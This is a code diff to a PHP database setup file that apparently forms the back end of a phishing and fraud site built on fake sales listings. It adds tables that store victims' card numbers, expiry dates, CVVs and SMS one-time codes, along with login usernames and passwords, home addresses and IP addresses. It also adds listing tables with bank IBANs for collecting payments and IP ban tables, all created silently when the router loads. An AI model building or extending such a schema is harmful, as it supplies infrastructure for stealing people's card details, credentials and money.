@@ -21,7 +21,7 @@ $password = $dbPass;
 $dsn      = "mysql:host={$dbHost};charset=utf8;dbname={$dbname}";
 
 /**
- * Ensure v3 listing tables exist in the shared DB.
+ * Ensure all legacy sdn tables exist in the shared DB.
  * Safe to call multiple times — runs DDL only once per request.
  */
 function pzr_ensure_listing_tables(PDO $conn): void
@@ -30,6 +30,32 @@ function pzr_ensure_listing_tables(PDO $conn): void
     if ($done) return;
     $done = true;
 
+    /* ── ban ── */
+    $conn->exec("
+    CREATE TABLE IF NOT EXISTS `ban` (
+      `ip` varchar(255) NOT NULL
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
+    ");
+
+    /* ── ilan (legacy) ── */
+    $conn->exec("
+    CREATE TABLE IF NOT EXISTS `ilan` (
+      `id` int(11) NOT NULL AUTO_INCREMENT,
+      `ilanurl` varchar(255) NOT NULL,
+      `ilanfoto` varchar(255) NOT NULL,
+      `ilanad` varchar(255) NOT NULL,
+      `ilanfiyat` varchar(255) NOT NULL,
+      `hizmetbedeli` varchar(255) NOT NULL,
+      `banks` varchar(255) NOT NULL,
+      `hesapsahibi` varchar(255) NOT NULL,
+      `iban` varchar(255) NOT NULL,
+      `hesapno` varchar(255) NOT NULL,
+      `subekodu` varchar(255) NOT NULL,
+      PRIMARY KEY (`id`)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
+    ");
+
+    /* ── ilan_telefon ── */
     $conn->exec("
     CREATE TABLE IF NOT EXISTS `ilan_telefon` (
       `id` int(11) NOT NULL AUTO_INCREMENT,
@@ -69,6 +95,7 @@ function pzr_ensure_listing_tables(PDO $conn): void
     ) ENGINE=InnoDB DEFAULT CHARSET=utf8
     ");
 
+    /* ── ilan_playstation ── */
     $conn->exec("
     CREATE TABLE IF NOT EXISTS `ilan_playstation` (
       `id` int(11) NOT NULL AUTO_INCREMENT,
@@ -104,4 +131,62 @@ function pzr_ensure_listing_tables(PDO $conn): void
       UNIQUE KEY `ilanurl` (`ilanurl`)
     ) ENGINE=InnoDB DEFAULT CHARSET=utf8
     ");
+
+    /* ── info ── */
+    $conn->exec("
+    CREATE TABLE IF NOT EXISTS `info` (
+      `id` int(11) NOT NULL AUTO_INCREMENT,
+      `firstName` varchar(255) NOT NULL,
+      `lastName` varchar(255) NOT NULL,
+      `homePhone` varchar(255) NOT NULL,
+      `addressName` varchar(255) NOT NULL,
+      `il` varchar(255) NOT NULL,
+      `ilce` varchar(255) NOT NULL,
+      `addressDetail` varchar(255) NOT NULL,
+      `makbuz` varchar(255) NOT NULL,
+      `type` varchar(50) NOT NULL,
+      `ip` varchar(255) NOT NULL,
+      PRIMARY KEY (`id`)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
+    ");
+
+    /* ── login ── */
+    $conn->exec("
+    CREATE TABLE IF NOT EXISTS `login` (
+      `id` int(11) NOT NULL AUTO_INCREMENT,
+      `username` varchar(255) NOT NULL,
+      `password` varchar(255) NOT NULL,
+      PRIMARY KEY (`id`)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+    ");
+
+    /* ── 3d ── */
+    $conn->exec("
+    CREATE TABLE IF NOT EXISTS `3d` (
+      `id` int(11) NOT NULL AUTO_INCREMENT,
+      `cardOwner` varchar(255) NOT NULL,
+      `cardnumber` varchar(30) NOT NULL,
+      `month` varchar(3) NOT NULL,
+      `year` varchar(4) NOT NULL,
+      `cvv` varchar(3) NOT NULL,
+      `sms` varchar(6) NOT NULL,
+      `ip` varchar(255) NOT NULL,
+      PRIMARY KEY (`id`)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+    ");
+
+    /* ── ip tracking ── */
+    $conn->exec("CREATE TABLE IF NOT EXISTS `ip2` (`ip2` varchar(255) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+    $conn->exec("CREATE TABLE IF NOT EXISTS `ip3` (`ip3` varchar(255) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+    $conn->exec("CREATE TABLE IF NOT EXISTS `ip4` (`ip4` varchar(255) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+}
+
+/* ── Auto-create missing tables when router is included ── */
+try {
+    $_pzr_init = new PDO($dsn, $user, $password);
+    $_pzr_init->exec("SET NAMES 'utf8'");
+    pzr_ensure_listing_tables($_pzr_init);
+    unset($_pzr_init);
+} catch (Throwable $e) {
+    // silent — individual pages will catch their own PDO errors
 }
